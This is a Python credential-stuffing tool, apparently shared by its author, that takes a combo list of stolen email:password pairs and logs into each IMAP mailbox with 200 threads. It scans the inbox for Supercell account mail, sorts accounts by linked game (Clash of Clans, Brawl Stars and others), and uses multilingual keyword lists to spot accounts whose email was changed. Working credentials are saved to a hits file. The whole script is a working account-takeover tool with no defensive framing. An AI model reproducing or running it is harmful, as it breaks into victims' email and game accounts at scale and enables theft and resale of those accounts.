import imaplib, email, sys, re, time, threading, os
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, init
""" @anasxzer00 """
init(autoreset=True)
#---Supercell Full Capture Inboxer, use t-online.de combo---#
AnasWorker = 200
anasxzer00 = input(" -- @anasxzer00 | Supercell Inbox Capture\n\n [×] Put Combo: ")
print("—" * 60)
h1 = 0
b1 = 0
u1 = 0
GamesCaptureAnas = {game: 0 for game in ["Clash Royale", "Clash of Clans", "Hay Day", "Squad Busters", "Brawl Stars"]}
lock = threading.Lock()
AnasSearch = "noreply@id.supercell.com"
u1_________keyw0rds = [
    "email address changed", "email adresse geändert", "adresse email modifiée",
    "cambio de dirección de correo", "メールアドレスが変更されました", "変更されたメールアドレス",
    "adresse e-mail changée", "メールアドレス変更", "adresa e-pošte je promijenjena",
    "домен почты изменен", "dirección de correo electrónico cambiada", "email адрес изменен",
    "adresse email changée", "cambiato indirizzo email", "e-posti aadress on muutunud",
    "adresa e-mail promijenjena", "correo electrónico cambiado", "adresa электронной почты изменена",
    "email id変更されました", "πολλαπλή διεύθυνση ηλεκτρονικού ταχυδρομείου άλλαξε",
    "คำแนะนำอีเมล์ถูกเปลี่ยน", "أن تغيير البريد الإلكتروني", "adresse email modifié",
    "correo de dirección cambiado", "cambio dirección correo", "Εχει αλλάξει η διεύθυνση ηλεκτρονικού ταχυδρομείου",
    "الإيميل تم تغييره", "電子郵件地址更改", "メールアドレスが変更されました", "تم تغي", "anasxzer00", "xxxx_private", "daikt bgem tool edit kay" ]
def im4p__serv(email_addr):
    domain = email_addr.split('@')[1]
    return f"imap.{domain}"
def clssssssss():
    os.system('cls' if os.name == 'nt' else 'clear')
def UpdateAnasSS():
    while True:
        clssssssss()
        sys.stdout.write(f"————————————————————————————————————————————————————————————\n")
        sys.stdout.write(f" -- {Fore.BLUE}@anasxzer00\n\n {Fore.GREEN}Hits{Fore.WHITE}: {h1} | {Fore.RED}Bad{Fore.WHITE}: {b1} | {Fore.YELLOW}Unlink{Fore.WHITE}: {u1}\n")
        sys.stdout.write(f"————————————————————————————————————————————————————————————\n")
        for game, count in GamesCaptureAnas.items():
            sys.stdout.write(f" >{Fore.CYAN}[∎] {game}: {count}\n")
        sys.stdout.write(f"————————————————————————————————————————————————————————————\n")
        sys.stdout.flush()
        time.sleep(1)
def CheckL0G1N(email_account):
    global h1, b1, u1, GamesCaptureAnas
    try:
        email_addr, password = email_account.strip().split(":")
    except ValueError:
        return
    imap_server = im4p__serv(email_addr)
    try:
        mail = imaplib.IMAP4_SSL(imap_server)
        mail.login(email_addr, password)
        mail.select("INBOX")
        result, data = mail.search(None, f'FROM "{AnasSearch}"')
        email_ids = data[0].split()
        linked_games = set()
        is_unlink = False
        is_hit = False
        for e_id in email_ids:
            result, msg_data = mail.fetch(e_id, "(RFC822)")
            raw_email = msg_data[0][1]
            msg = email.message_from_bytes(raw_email)
            subject = msg["Subject"] or ""
            body = ""
            if msg.is_multipart():
                for part in msg.walk():
                    if part.get_content_type() == "text/plain":
                        body += part.get_payload(decode=True).decode(errors="ignore")
            else:
                body = msg.get_payload(decode=True).decode(errors="ignore")
            for keyword in u1_________keyw0rds:
                if re.search(keyword, subject, re.IGNORECASE) or re.search(keyword, body, re.IGNORECASE):
                    is_unlink = True
                    break
            if AnasSearch in subject or AnasSearch in body:
                is_hit = True
            for game in GamesCaptureAnas.keys():
                if game in subject or game in body:
                    linked_games.add(game)                    
        with lock:
            if is_unlink:
                u1 += 1
            elif is_hit or linked_games:
                h1 += 1
                for game in linked_games:
                    GamesCaptureAnas[game] += 1
                with open("Supercell-Hits.txt", "a", encoding="utf-8") as f:
                    f.write(f"{email_addr}:{password} | Linked = {list(linked_games)}\n")
            else:
                b1 += 1
        mail.logout()
    except Exception:
        with lock:
            b1 += 1
def main():
    threading.Thread(target=UpdateAnasSS, daemon=True).start()
    with open(anasxzer00, "r", encoding="utf-8", errors="ignore") as f:
        combo_list = [line.strip() for line in f if ":" in line]
    with ThreadPoolExecutor(max_workers=AnasWorker) as executor:
        executor.map(CheckL0G1N, combo_list)
if __name__ == "__main__":
    main()